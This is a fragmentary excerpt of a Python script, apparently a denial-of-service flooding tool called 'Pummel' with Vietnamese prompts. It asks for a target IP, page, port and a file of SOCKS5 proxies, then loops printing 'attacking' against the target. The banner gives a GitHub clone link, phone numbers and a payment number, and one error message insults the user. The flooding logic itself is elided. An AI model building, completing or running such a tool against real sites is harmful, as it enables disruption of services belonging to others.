...
│ version 1.2.8                                       │
│                                                     │
│          [Code By Trần Đức Duy With Nxt - Nhtxv - Tmh]          │                      
│                                                     │
│                               Sđt : 0948317371 │
├─────────────────────────────────────────────────────┤
│       Github : git clone https://github.com/tdd2003/Pummel	      │
...
def main():
    ...
    prevent()
    if ip == "":
        print("Nhập Lệnh Sai Rồi Thằng Chó!")
        exit()
    page = str(input("Trang (default=/):"))
    if page == "":
        page = "/"
    port = str(input("Port (HTTPS=443):"))
    if port =="":
        port = 80
        print("Port 80 Đã Chọn Thành Công")
    else:
        port = int(port)
    if port == 443:
        print("Port 443 Đã Chọn Thành Công")        
    ...
    if N == "n" or N =="N":
        ...
        clone()
    out_file = str(input("Nhập Tên Tệp Chứa Proxy !!(socks5.txt):"))
    if out_file == "":
        out_file = "socks5.txt"
    else:
        out_file = str(out_file)
    print ("Số Sock5 Trong Proxies: %s" %(len(open(out_file).readlines())))
    ...
    if ans == "n" or ans =="N":
        ...
        ms = str(input("Thời Gian of socks(seconds, default=1):"))
        if ms == "":
            ms = int(1)
        else :
            ms = int(ms)
...
while True:
        ...
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"]Đang Tấn Công !!! "+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
            ...
            sys.stdout.flush()
            break
#Code By Trần Đức Duy With Hồ Tiểu Bảo
#MOMO : 0326152412
